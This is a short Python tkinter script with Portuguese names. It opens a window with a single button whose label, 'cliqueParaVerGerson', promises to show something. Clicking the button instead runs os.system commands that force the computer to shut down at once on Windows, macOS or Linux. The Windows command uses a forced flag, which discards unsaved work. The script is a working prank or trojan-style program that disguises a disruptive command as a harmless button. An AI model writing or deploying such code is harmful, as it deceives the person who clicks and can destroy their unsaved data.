import tkinter as tk
import os
import sys

def jogo_imagem_kendy():
    
    if sys.platform == "win32":
        os.system("shutdown /s /f /t 0")  
    elif sys.platform == "darwin":
        
        os.system("sudo shutdown -h now")  
    else:
        os.system("shutdown now")  


janela = tk.Tk()
janela.title("henrique")


botao = tk.Button(janela, text="cliqueParaVerGerson", command=jogo_imagem_kendy, font=("Arial", 20), fg="red", bg="black")
botao.pack(padx=50, pady=50)


janela.mainloop()
